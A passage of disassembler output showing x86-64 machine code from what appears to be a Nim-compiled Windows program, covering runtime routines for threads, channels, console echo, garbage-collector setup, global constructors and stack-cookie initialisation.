  406a1a:	eb d4                	jmp    4069f0 <NimMainInner+0xab3>
  406a1c:	48 8b 15 1d 44 02 00 	mov    0x2441d(%rip),%rdx        # 42ae40 <mainThread__B7bJyClR3J8biZ7mpTlhzA>
  406a23:	48 ff c8             	dec    %rax
  406a26:	41 b9 01 00 00 00    	mov    $0x1,%r9d
  406a2c:	4d 89 e8             	mov    %r13,%r8
  406a2f:	49 0f af 55 00       	imul   0x0(%r13),%rdx
  406a34:	48 89 05 15 44 02 00 	mov    %rax,0x24415(%rip)        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  406a3b:	48 03 15 26 44 02 00 	add    0x24426(%rip),%rdx        # 42ae68 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x28>
  406a42:	48 8d 0d ef e5 01 00 	lea    0x1e5ef(%rip),%rcx        # 425038 <channel__N5eXcSZk9cFx3Xyn4EpWNYw+0x8>
  406a49:	e8 b8 ec ff ff       	call   405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23>
  406a4e:	48 8b 05 eb 43 02 00 	mov    0x243eb(%rip),%rax        # 42ae40 <mainThread__B7bJyClR3J8biZ7mpTlhzA>
  406a55:	48 ff c0             	inc    %rax
  406a58:	48 23 05 f9 43 02 00 	and    0x243f9(%rip),%rax        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  406a5f:	48 89 05 da 43 02 00 	mov    %rax,0x243da(%rip)        # 42ae40 <mainThread__B7bJyClR3J8biZ7mpTlhzA>
  406a66:	48 8b 05 f3 43 02 00 	mov    0x243f3(%rip),%rax        # 42ae60 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x20>
  406a6d:	48 85 c0             	test   %rax,%rax
  406a70:	7f 7e                	jg     406af0 <NimMainInner+0xbb3>
  406a72:	e9 92 00 00 00       	jmp    406b09 <NimMainInner+0xbcc>
  406a77:	48 8d 0d f2 43 02 00 	lea    0x243f2(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  406a7e:	ff d5                	call   *%rbp
  406a80:	48 8d 0d 99 e6 01 00 	lea    0x1e699(%rip),%rcx        # 425120 <NTI__Ie1m0dv1ZHg72IgPRr1cDw_>
  406a87:	ba 30 00 00 00       	mov    $0x30,%edx
  406a8c:	e8 55 d2 ff ff       	call   403ce6 <newObj>
  406a91:	48 8d 0d 88 ab 00 00 	lea    0xab88(%rip),%rcx        # 411620 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_46>
  406a98:	48 89 c3             	mov    %rax,%rbx
  406a9b:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  406a9f:	48 8d 05 5a e7 01 00 	lea    0x1e75a(%rip),%rax        # 425200 <NTI__yoNlBGx0D2tRizIdhQuENw_>
  406aa6:	48 89 03             	mov    %rax,(%rbx)
  406aa9:	48 8d 05 d2 57 00 00 	lea    0x57d2(%rip),%rax        # 40c282 <.rdata+0x282>
  406ab0:	48 89 43 10          	mov    %rax,0x10(%rbx)
  406ab4:	e8 87 d1 ff ff       	call   403c40 <copyStringRC1>
  406ab9:	48 85 f6             	test   %rsi,%rsi
  406abc:	48 89 43 18          	mov    %rax,0x18(%rbx)
  406ac0:	74 08                	je     406aca <NimMainInner+0xb8d>
  406ac2:	48 89 f1             	mov    %rsi,%rcx
  406ac5:	e8 67 c4 ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.80>
  406aca:	48 c7 44 24 20 31 00 	movq   $0x31,0x20(%rsp)
  406ad1:	00 00 
  406ad3:	4c 8d 0d 6b 56 00 00 	lea    0x566b(%rip),%r9        # 40c145 <.rdata+0x145>
  406ada:	48 89 d9             	mov    %rbx,%rcx
  406add:	4c 8d 05 6b 56 00 00 	lea    0x566b(%rip),%r8        # 40c14f <.rdata+0x14f>
  406ae4:	48 8d 15 97 57 00 00 	lea    0x5797(%rip),%rdx        # 40c282 <.rdata+0x282>
  406aeb:	e8 c8 e7 ff ff       	call   4052b8 <raiseExceptionEx>
  406af0:	48 ff c8             	dec    %rax
  406af3:	48 39 05 56 43 02 00 	cmp    %rax,0x24356(%rip)        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  406afa:	75 0d                	jne    406b09 <NimMainInner+0xbcc>
  406afc:	48 8b 0d 95 43 02 00 	mov    0x24395(%rip),%rcx        # 42ae98 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x58>
  406b03:	ff 15 2f 43 02 00    	call   *0x2432f(%rip)        # 42ae38 <Dl_1285039_>
  406b09:	c6 05 20 e5 01 00 01 	movb   $0x1,0x1e520(%rip)        # 425030 <channel__N5eXcSZk9cFx3Xyn4EpWNYw>
  406b10:	48 8d 0d 59 43 02 00 	lea    0x24359(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  406b17:	ff d5                	call   *%rbp
  406b19:	80 3d 10 e5 01 00 00 	cmpb   $0x0,0x1e510(%rip)        # 425030 <channel__N5eXcSZk9cFx3Xyn4EpWNYw>
  406b20:	0f 84 5d fe ff ff    	je     406983 <NimMainInner+0xa46>
  406b26:	ba 08 00 00 00       	mov    $0x8,%edx
  406b2b:	48 89 d9             	mov    %rbx,%rcx
  406b2e:	e8 8f ae ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  406b33:	48 8b 0d fe e4 01 00 	mov    0x1e4fe(%rip),%rcx        # 425038 <channel__N5eXcSZk9cFx3Xyn4EpWNYw+0x8>
  406b3a:	e8 84 d5 ff ff       	call   4040c3 <copyString>
  406b3f:	48 8d 0d ba e4 01 00 	lea    0x1e4ba(%rip),%rcx        # 425000 <echoLock__N6SWfXRvlztVlLUFTGu6OQ>
  406b46:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
  406b4d:	00 
  406b4e:	41 ff d7             	call   *%r15
  406b51:	48 8b bc 24 a0 00 00 	mov    0xa0(%rsp),%rdi
  406b58:	00 
  406b59:	b9 01 00 00 00       	mov    $0x1,%ecx
  406b5e:	4c 8b 25 9b 45 00 00 	mov    0x459b(%rip),%r12        # 40b100 <__imp___acrt_iob_func>
  406b65:	41 ff d4             	call   *%r12
  406b68:	49 89 c6             	mov    %rax,%r14
  406b6b:	48 89 f9             	mov    %rdi,%rcx
  406b6e:	e8 de a9 ff ff       	call   401551 <nimToCStringConv.lto_priv.53>
  406b73:	48 8d 15 13 57 00 00 	lea    0x5713(%rip),%rdx        # 40c28d <.rdata+0x28d>
  406b7a:	4c 89 f1             	mov    %r14,%rcx
  406b7d:	49 89 c0             	mov    %rax,%r8
  406b80:	e8 8b 18 00 00       	call   408410 <fprintf>
  406b85:	89 c6                	mov    %eax,%esi
  406b87:	31 d2                	xor    %edx,%edx
  406b89:	48 85 ff             	test   %rdi,%rdi
  406b8c:	48 63 c6             	movslq %esi,%rax
  406b8f:	74 03                	je     406b94 <NimMainInner+0xc57>
  406b91:	48 8b 17             	mov    (%rdi),%rdx
  406b94:	48 39 c2             	cmp    %rax,%rdx
  406b97:	7e 35                	jle    406bce <NimMainInner+0xc91>
  406b99:	80 7c 07 10 00       	cmpb   $0x0,0x10(%rdi,%rax,1)
  406b9e:	75 12                	jne    406bb2 <NimMainInner+0xc75>
  406ba0:	31 c9                	xor    %ecx,%ecx
  406ba2:	4c 89 f2             	mov    %r14,%rdx
  406ba5:	e8 7e 1a 00 00       	call   408628 <fputc>
  406baa:	85 c0                	test   %eax,%eax
  406bac:	75 20                	jne    406bce <NimMainInner+0xc91>
  406bae:	ff c6                	inc    %esi
  406bb0:	eb d5                	jmp    406b87 <NimMainInner+0xc4a>
  406bb2:	4c 8d 44 07 10       	lea    0x10(%rdi,%rax,1),%r8
  406bb7:	4c 89 f1             	mov    %r14,%rcx
  406bba:	48 8d 15 cc 56 00 00 	lea    0x56cc(%rip),%rdx        # 40c28d <.rdata+0x28d>
  406bc1:	e8 4a 18 00 00       	call   408410 <fprintf>
  406bc6:	85 c0                	test   %eax,%eax
  406bc8:	7e 04                	jle    406bce <NimMainInner+0xc91>
  406bca:	01 c6                	add    %eax,%esi
  406bcc:	eb b9                	jmp    406b87 <NimMainInner+0xc4a>
  406bce:	b9 01 00 00 00       	mov    $0x1,%ecx
  406bd3:	41 ff d4             	call   *%r12
  406bd6:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  406bdc:	ba 01 00 00 00       	mov    $0x1,%edx
  406be1:	48 8d 0d 84 54 00 00 	lea    0x5484(%rip),%rcx        # 40c06c <.rdata+0x6c>
  406be8:	49 89 c1             	mov    %rax,%r9
  406beb:	e8 10 18 00 00       	call   408400 <fwrite>
  406bf0:	b9 01 00 00 00       	mov    $0x1,%ecx
  406bf5:	41 ff d4             	call   *%r12
  406bf8:	48 89 c1             	mov    %rax,%rcx
  406bfb:	e8 18 18 00 00       	call   408418 <fflush>
  406c00:	48 8d 0d f9 e3 01 00 	lea    0x1e3f9(%rip),%rcx        # 425000 <echoLock__N6SWfXRvlztVlLUFTGu6OQ>
  406c07:	ff d5                	call   *%rbp
  406c09:	e9 75 fd ff ff       	jmp    406983 <NimMainInner+0xa46>
  406c0e:	48 39 ca             	cmp    %rcx,%rdx
  406c11:	74 0d                	je     406c20 <NimMainInner+0xce3>
  406c13:	48 85 d2             	test   %rdx,%rdx
  406c16:	74 08                	je     406c20 <NimMainInner+0xce3>
  406c18:	48 ff c0             	inc    %rax
  406c1b:	e9 e7 f4 ff ff       	jmp    406107 <NimMainInner+0x1ca>
  406c20:	49 8b 95 58 34 00 00 	mov    0x3458(%r13),%rdx
  406c27:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
  406c2b:	48 8b 7c c2 10       	mov    0x10(%rdx,%rax,8),%rdi
  406c30:	48 85 ff             	test   %rdi,%rdi
  406c33:	74 07                	je     406c3c <NimMainInner+0xcff>
  406c35:	48 8b 07             	mov    (%rdi),%rax
  406c38:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  406c3c:	4c 8d 46 01          	lea    0x1(%rsi),%r8
  406c40:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
  406c44:	4d 85 c0             	test   %r8,%r8
  406c47:	7e 28                	jle    406c71 <NimMainInner+0xd34>
  406c49:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
  406c4d:	ba 3d 00 00 00       	mov    $0x3d,%edx
  406c52:	e8 c9 19 00 00       	call   408620 <memchr>
  406c57:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
  406c5b:	48 85 c0             	test   %rax,%rax
  406c5e:	49 89 c0             	mov    %rax,%r8
  406c61:	74 0e                	je     406c71 <NimMainInner+0xd34>
  406c63:	48 89 f9             	mov    %rdi,%rcx
  406c66:	e8 e6 a8 ff ff       	call   401551 <nimToCStringConv.lto_priv.53>
  406c6b:	4c 89 c2             	mov    %r8,%rdx
  406c6e:	48 29 c2             	sub    %rax,%rdx
  406c71:	48 ff c2             	inc    %rdx
  406c74:	49 89 f0             	mov    %rsi,%r8
  406c77:	48 89 f9             	mov    %rdi,%rcx
  406c7a:	e8 94 d1 ff ff       	call   403e13 <substr__2yh9cer0ymNRHlOOg8P7IuA>
  406c7f:	e9 ff f4 ff ff       	jmp    406183 <NimMainInner+0x246>
  406c84:	45 31 c0             	xor    %r8d,%r8d
  406c87:	48 85 c0             	test   %rax,%rax
  406c8a:	0f 85 11 f5 ff ff    	jne    4061a1 <NimMainInner+0x264>
  406c90:	e9 27 f6 ff ff       	jmp    4062bc <NimMainInner+0x37f>

0000000000406c95 <initGC__amVlU9ajqZ06ujoesRBHcDg>:
  406c95:	53                   	push   %rbx
  406c96:	48 83 ec 20          	sub    $0x20,%rsp
  406c9a:	e8 01 b0 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  406c9f:	b9 00 20 00 00       	mov    $0x2000,%ecx
  406ca4:	48 c7 40 40 00 00 40 	movq   $0x400000,0x40(%rax)
  406cab:	00 
  406cac:	48 89 c3             	mov    %rax,%rbx
  406caf:	48 c7 40 48 f4 01 00 	movq   $0x1f4,0x48(%rax)
  406cb6:	00 
  406cb7:	48 c7 80 90 33 00 00 	movq   $0x0,0x3390(%rax)
  406cbe:	00 00 00 00 
  406cc2:	48 c7 80 98 33 00 00 	movq   $0x0,0x3398(%rax)
  406cc9:	00 00 00 00 
  406ccd:	48 c7 80 a0 33 00 00 	movq   $0x0,0x33a0(%rax)
  406cd4:	00 00 00 00 
  406cd8:	48 c7 80 a8 33 00 00 	movq   $0x0,0x33a8(%rax)
  406cdf:	00 00 00 00 
  406ce3:	48 c7 80 b0 33 00 00 	movq   $0x0,0x33b0(%rax)
  406cea:	00 00 00 00 
  406cee:	48 c7 80 b8 33 00 00 	movq   $0x0,0x33b8(%rax)
  406cf5:	00 00 00 00 
  406cf9:	48 c7 40 50 00 00 00 	movq   $0x0,0x50(%rax)
  406d00:	00 
  406d01:	48 c7 40 58 00 04 00 	movq   $0x400,0x58(%rax)
  406d08:	00 
  406d09:	e8 54 c2 ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  406d0e:	b9 00 20 00 00       	mov    $0x2000,%ecx
  406d13:	48 c7 83 80 00 00 00 	movq   $0x0,0x80(%rbx)
  406d1a:	00 00 00 00 
  406d1e:	48 89 43 60          	mov    %rax,0x60(%rbx)
  406d22:	48 c7 83 88 00 00 00 	movq   $0x400,0x88(%rbx)
  406d29:	00 04 00 00 
  406d2d:	e8 30 c2 ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  406d32:	48 c7 43 68 00 00 00 	movq   $0x0,0x68(%rbx)
  406d39:	00 
  406d3a:	b9 00 20 00 00       	mov    $0x2000,%ecx
  406d3f:	48 89 83 90 00 00 00 	mov    %rax,0x90(%rbx)
  406d46:	48 c7 43 70 00 04 00 	movq   $0x400,0x70(%rbx)
  406d4d:	00 
  406d4e:	e8 0f c2 ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  406d53:	b9 00 20 00 00       	mov    $0x2000,%ecx
  406d58:	48 89 43 78          	mov    %rax,0x78(%rbx)
  406d5c:	e8 01 c2 ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  406d61:	b9 00 20 00 00       	mov    $0x2000,%ecx
  406d66:	48 c7 83 d0 33 00 00 	movq   $0x3ff,0x33d0(%rbx)
  406d6d:	ff 03 00 00 
  406d71:	48 89 83 e0 33 00 00 	mov    %rax,0x33e0(%rbx)
  406d78:	48 c7 83 c8 33 00 00 	movq   $0x0,0x33c8(%rbx)
  406d7f:	00 00 00 00 
  406d83:	48 c7 83 d8 33 00 00 	movq   $0x0,0x33d8(%rbx)
  406d8a:	00 00 00 00 
  406d8e:	48 c7 83 e8 33 00 00 	movq   $0x0,0x33e8(%rbx)
  406d95:	00 00 00 00 
  406d99:	48 c7 83 f0 33 00 00 	movq   $0x400,0x33f0(%rbx)
  406da0:	00 04 00 00 
  406da4:	e8 b9 c1 ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  406da9:	48 8d 8b 10 34 00 00 	lea    0x3410(%rbx),%rcx
  406db0:	48 89 83 f8 33 00 00 	mov    %rax,0x33f8(%rbx)
  406db7:	ff 15 f7 14 04 00    	call   *0x414f7(%rip)        # 4482b4 <__imp_InitializeCriticalSection>
  406dbd:	b8 01 00 00 00       	mov    $0x1,%eax
  406dc2:	48 c7 83 00 34 00 00 	movq   $0x0,0x3400(%rbx)
  406dc9:	00 00 00 00 
  406dcd:	48 c7 83 08 34 00 00 	movq   $0x0,0x3408(%rbx)
  406dd4:	00 00 00 00 
  406dd8:	f0 48 0f c1 05 5f d2 	lock xadd %rax,0xd25f(%rip)        # 414040 <gHeapidGenerator__hd54mEUTGcVuZLChYgtR9bg>
  406ddf:	00 00 
  406de1:	48 89 83 38 34 00 00 	mov    %rax,0x3438(%rbx)
  406de8:	48 83 c4 20          	add    $0x20,%rsp
  406dec:	5b                   	pop    %rbx
  406ded:	c3                   	ret

0000000000406dee <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA>:
  406dee:	41 56                	push   %r14
  406df0:	41 55                	push   %r13
  406df2:	41 54                	push   %r12
  406df4:	55                   	push   %rbp
  406df5:	57                   	push   %rdi
  406df6:	56                   	push   %rsi
  406df7:	53                   	push   %rbx
  406df8:	48 83 ec 30          	sub    $0x30,%rsp
  406dfc:	48 8b 31             	mov    (%rcx),%rsi
  406dff:	49 89 cd             	mov    %rcx,%r13
  406e02:	48 89 f2             	mov    %rsi,%rdx
  406e05:	8b 0d 9d 2d 02 00    	mov    0x22d9d(%rip),%ecx        # 429ba8 <globalsSlot__ciXDZu9c27pHpCRMoz4RIgw>
  406e0b:	ff 15 13 15 04 00    	call   *0x41513(%rip)        # 448324 <__imp_TlsSetValue>
  406e11:	48 8d 05 41 e3 ff ff 	lea    -0x1cbf(%rip),%rax        # 405159 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2>
  406e18:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
  406e1d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  406e22:	e8 ae ae ff ff       	call   401cd5 <nimGC_setStackBottom>
  406e27:	e8 69 fe ff ff       	call   406c95 <initGC__amVlU9ajqZ06ujoesRBHcDg>
  406e2c:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  406e31:	4c 89 e9             	mov    %r13,%rcx
  406e34:	ff d0                	call   *%rax
  406e36:	e8 65 ae ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  406e3b:	48 8d 98 a0 31 00 00 	lea    0x31a0(%rax),%rbx
  406e42:	48 89 c5             	mov    %rax,%rbp
  406e45:	48 8b 03             	mov    (%rbx),%rax
  406e48:	31 ff                	xor    %edi,%edi
  406e4a:	4c 8b b3 e8 01 00 00 	mov    0x1e8(%rbx),%r14
  406e51:	4c 8d 60 ff          	lea    -0x1(%rax),%r12
  406e55:	49 39 fc             	cmp    %rdi,%r12
  406e58:	7d 11                	jge    406e6b <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA+0x7d>
  406e5a:	4d 85 f6             	test   %r14,%r14
  406e5d:	4c 89 f3             	mov    %r14,%rbx
  406e60:	75 e3                	jne    406e45 <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA+0x57>
  406e62:	48 8b 8d 18 29 00 00 	mov    0x2918(%rbp),%rcx
  406e69:	eb 16                	jmp    406e81 <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA+0x93>
  406e6b:	48 89 f8             	mov    %rdi,%rax
  406e6e:	48 ff c7             	inc    %rdi
  406e71:	48 c1 e0 04          	shl    $0x4,%rax
  406e75:	48 8b 4c 03 08       	mov    0x8(%rbx,%rax,1),%rcx
  406e7a:	e8 26 af ff ff       	call   401da5 <osDeallocPages__dRMEutPSAkbR9b9blNmTzvoQsystem.isra.6>
  406e7f:	eb d4                	jmp    406e55 <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA+0x67>
  406e81:	48 85 c9             	test   %rcx,%rcx
  406e84:	74 0e                	je     406e94 <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA+0xa6>
  406e86:	48 8b 59 10          	mov    0x10(%rcx),%rbx
  406e8a:	e8 16 af ff ff       	call   401da5 <osDeallocPages__dRMEutPSAkbR9b9blNmTzvoQsystem.isra.6>
  406e8f:	48 89 d9             	mov    %rbx,%rcx
  406e92:	eb ed                	jmp    406e81 <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA+0x93>
  406e94:	48 c7 85 18 29 00 00 	movq   $0x0,0x2918(%rbp)
  406e9b:	00 00 00 00 
  406e9f:	48 8d 0d 1a 2d 02 00 	lea    0x22d1a(%rip),%rcx        # 429bc0 <heapLock__Cm9aJxbMhUuv7Cj8trffHQw>
  406ea6:	49 c7 45 00 00 00 00 	movq   $0x0,0x0(%r13)
  406ead:	00 
  406eae:	49 c7 45 10 00 00 00 	movq   $0x0,0x10(%r13)
  406eb5:	00 
  406eb6:	ff 15 b0 13 04 00    	call   *0x413b0(%rip)        # 44826c <__imp_EnterCriticalSection>
  406ebc:	48 8d 56 f0          	lea    -0x10(%rsi),%rdx
  406ec0:	48 8d 0d 39 ae 01 00 	lea    0x1ae39(%rip),%rcx        # 421d00 <sharedHeap__R3bhvQCN0d6AYpkvxfT9aGw>
  406ec7:	e8 48 b5 ff ff       	call   402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>
  406ecc:	48 8d 0d ed 2c 02 00 	lea    0x22ced(%rip),%rcx        # 429bc0 <heapLock__Cm9aJxbMhUuv7Cj8trffHQw>
  406ed3:	ff 15 e3 13 04 00    	call   *0x413e3(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  406ed9:	31 c0                	xor    %eax,%eax
  406edb:	48 83 c4 30          	add    $0x30,%rsp
  406edf:	5b                   	pop    %rbx
  406ee0:	5e                   	pop    %rsi
  406ee1:	5f                   	pop    %rdi
  406ee2:	5d                   	pop    %rbp
  406ee3:	41 5c                	pop    %r12
  406ee5:	41 5d                	pop    %r13
  406ee7:	41 5e                	pop    %r14
  406ee9:	c3                   	ret
  406eea:	90                   	nop
  406eeb:	90                   	nop
  406eec:	90                   	nop
  406eed:	90                   	nop
  406eee:	90                   	nop
  406eef:	90                   	nop

0000000000406ef0 <__do_global_dtors>:
  406ef0:	48 83 ec 28          	sub    $0x28,%rsp
  406ef4:	48 8b 05 a5 41 00 00 	mov    0x41a5(%rip),%rax        # 40b0a0 <p.93846>
  406efb:	48 8b 00             	mov    (%rax),%rax
  406efe:	48 85 c0             	test   %rax,%rax
  406f01:	74 1d                	je     406f20 <__do_global_dtors+0x30>
  406f03:	ff d0                	call   *%rax
  406f05:	48 8b 05 94 41 00 00 	mov    0x4194(%rip),%rax        # 40b0a0 <p.93846>
  406f0c:	48 8d 50 08          	lea    0x8(%rax),%rdx
  406f10:	48 8b 40 08          	mov    0x8(%rax),%rax
  406f14:	48 89 15 85 41 00 00 	mov    %rdx,0x4185(%rip)        # 40b0a0 <p.93846>
  406f1b:	48 85 c0             	test   %rax,%rax
  406f1e:	75 e3                	jne    406f03 <__do_global_dtors+0x13>
  406f20:	48 83 c4 28          	add    $0x28,%rsp
  406f24:	c3                   	ret
  406f25:	90                   	nop
  406f26:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  406f2d:	00 00 00 

0000000000406f30 <__do_global_ctors>:
  406f30:	56                   	push   %rsi
  406f31:	53                   	push   %rbx
  406f32:	48 83 ec 28          	sub    $0x28,%rsp
  406f36:	48 8b 0d 43 ad 00 00 	mov    0xad43(%rip),%rcx        # 411c80 <.refptr.__CTOR_LIST__>
  406f3d:	48 8b 11             	mov    (%rcx),%rdx
  406f40:	83 fa ff             	cmp    $0xffffffff,%edx
  406f43:	89 d0                	mov    %edx,%eax
  406f45:	74 39                	je     406f80 <__do_global_ctors+0x50>
  406f47:	85 c0                	test   %eax,%eax
  406f49:	74 20                	je     406f6b <__do_global_ctors+0x3b>
  406f4b:	89 c2                	mov    %eax,%edx
  406f4d:	83 e8 01             	sub    $0x1,%eax
  406f50:	48 8d 1c d1          	lea    (%rcx,%rdx,8),%rbx
  406f54:	48 29 c2             	sub    %rax,%rdx
  406f57:	48 8d 74 d1 f8       	lea    -0x8(%rcx,%rdx,8),%rsi
  406f5c:	0f 1f 40 00          	nopl   0x0(%rax)
  406f60:	ff 13                	call   *(%rbx)
  406f62:	48 83 eb 08          	sub    $0x8,%rbx
  406f66:	48 39 f3             	cmp    %rsi,%rbx
  406f69:	75 f5                	jne    406f60 <__do_global_ctors+0x30>
  406f6b:	48 8d 0d 7e ff ff ff 	lea    -0x82(%rip),%rcx        # 406ef0 <__do_global_dtors>
  406f72:	48 83 c4 28          	add    $0x28,%rsp
  406f76:	5b                   	pop    %rbx
  406f77:	5e                   	pop    %rsi
  406f78:	e9 93 a5 ff ff       	jmp    401510 <atexit>
  406f7d:	0f 1f 00             	nopl   (%rax)
  406f80:	31 c0                	xor    %eax,%eax
  406f82:	eb 02                	jmp    406f86 <__do_global_ctors+0x56>
  406f84:	89 d0                	mov    %edx,%eax
  406f86:	44 8d 40 01          	lea    0x1(%rax),%r8d
  406f8a:	4a 83 3c c1 00       	cmpq   $0x0,(%rcx,%r8,8)
  406f8f:	4c 89 c2             	mov    %r8,%rdx
  406f92:	75 f0                	jne    406f84 <__do_global_ctors+0x54>
  406f94:	eb b1                	jmp    406f47 <__do_global_ctors+0x17>
  406f96:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  406f9d:	00 00 00 

0000000000406fa0 <__main>:
  406fa0:	8b 05 9a 72 02 00    	mov    0x2729a(%rip),%eax        # 42e240 <initialized>
  406fa6:	85 c0                	test   %eax,%eax
  406fa8:	74 06                	je     406fb0 <__main+0x10>
  406faa:	c3                   	ret
  406fab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  406fb0:	c7 05 86 72 02 00 01 	movl   $0x1,0x27286(%rip)        # 42e240 <initialized>
  406fb7:	00 00 00 
  406fba:	e9 71 ff ff ff       	jmp    406f30 <__do_global_ctors>
  406fbf:	90                   	nop

0000000000406fc0 <my_lconv_init>:
  406fc0:	48 ff 25 bd 13 04 00 	rex.W jmp *0x413bd(%rip)        # 448384 <__imp___lconv_init>
  406fc7:	90                   	nop
  406fc8:	90                   	nop
  406fc9:	90                   	nop
  406fca:	90                   	nop
  406fcb:	90                   	nop
  406fcc:	90                   	nop
  406fcd:	90                   	nop
  406fce:	90                   	nop
  406fcf:	90                   	nop

0000000000406fd0 <_setargv>:
  406fd0:	31 c0                	xor    %eax,%eax
  406fd2:	c3                   	ret
  406fd3:	90                   	nop
  406fd4:	90                   	nop
  406fd5:	90                   	nop
  406fd6:	90                   	nop
  406fd7:	90                   	nop
  406fd8:	90                   	nop
  406fd9:	90                   	nop
  406fda:	90                   	nop
  406fdb:	90                   	nop
  406fdc:	90                   	nop
  406fdd:	90                   	nop
  406fde:	90                   	nop
  406fdf:	90                   	nop

0000000000406fe0 <__security_init_cookie>:
  406fe0:	41 54                	push   %r12
  406fe2:	55                   	push   %rbp
  406fe3:	57                   	push   %rdi
  406fe4:	56                   	push   %rsi
  406fe5:	53                   	push   %rbx
  406fe6:	48 83 ec 30          	sub    $0x30,%rsp
  406fea:	48 8b 1d 4f 41 00 00 	mov    0x414f(%rip),%rbx        # 40b140 <__security_cookie>
  406ff1:	48 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rax
  406ff8:	2b 00 00 
  406ffb:	48 39 c3             	cmp    %rax,%rbx
  406ffe:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  407005:	00 00 
  407007:	74 17                	je     407020 <__security_init_cookie+0x40>
  407009:	48 f7 d3             	not    %rbx
  40700c:	48 89 1d 3d 41 00 00 	mov    %rbx,0x413d(%rip)        # 40b150 <__security_cookie_complement>
  407013:	48 83 c4 30          	add    $0x30,%rsp
  407017:	5b                   	pop    %rbx
  407018:	5e                   	pop    %rsi
  407019:	5f                   	pop    %rdi
  40701a:	5d                   	pop    %rbp
  40701b:	41 5c                	pop    %r12
  40701d:	c3                   	ret
  40701e:	66 90                	xchg   %ax,%ax
  407020:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  407025:	ff 15 79 12 04 00    	call   *0x41279(%rip)        # 4482a4 <__imp_GetSystemTimeAsFileTime>
  40702b:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
  407030:	ff 15 46 12 04 00    	call   *0x41246(%rip)        # 44827c <__imp_GetCurrentProcessId>
  407036:	41 89 c4             	mov    %eax,%r12d
  407039:	ff 15 45 12 04 00    	call   *0x41245(%rip)        # 448284 <__imp_GetCurrentThreadId>
  40703f:	89 c5                	mov    %eax,%ebp
  407041:	ff 15 65 12 04 00    	call   *0x41265(%rip)        # 4482ac <__imp_GetTickCount>
  407047:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
  40704c:	89 c7                	mov    %eax,%edi
  40704e:	ff 15 78 12 04 00    	call   *0x41278(%rip)        # 4482cc <__imp_QueryPerformanceCounter>
  407054:	48 33 74 24 28       	xor    0x28(%rsp),%rsi
  407059:	44 89 e0             	mov    %r12d,%eax
  40705c:	48 ba ff ff ff ff ff 	movabs $0xffffffffffff,%rdx
  407063:	ff 00 00 
  407066:	48 31 f0             	xor    %rsi,%rax
  407069:	89 ee                	mov    %ebp,%esi
  40706b:	48 31 c6             	xor    %rax,%rsi
  40706e:	89 f8                	mov    %edi,%eax
  407070:	48 31 f0             	xor    %rsi,%rax
  407073:	48 21 d0             	and    %rdx,%rax
  407076:	48 39 d8             	cmp    %rbx,%rax
  407079:	74 25                	je     4070a0 <__security_init_cookie+0xc0>
  40707b:	48 89 c2             	mov    %rax,%rdx
  40707e:	48 f7 d2             	not    %rdx
  407081:	48 89 05 b8 40 00 00 	mov    %rax,0x40b8(%rip)        # 40b140 <__security_cookie>
  407088:	48 89 15 c1 40 00 00 	mov    %rdx,0x40c1(%rip)        # 40b150 <__security_cookie_complement>
  40708f:	48 83 c4 30          	add    $0x30,%rsp
  407093:	5b                   	pop    %rbx
  407094:	5e                   	pop    %rsi
  407095:	5f                   	pop    %rdi
  407096:	5d                   	pop    %rbp
  407097:	41 5c                	pop    %r12
  407099:	c3                   	ret
  40709a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4070a0:	48 ba cc 5d 20 d2 66 	movabs $0xffffd466d2205dcc,%rdx
  4070a7:	d4 ff ff 
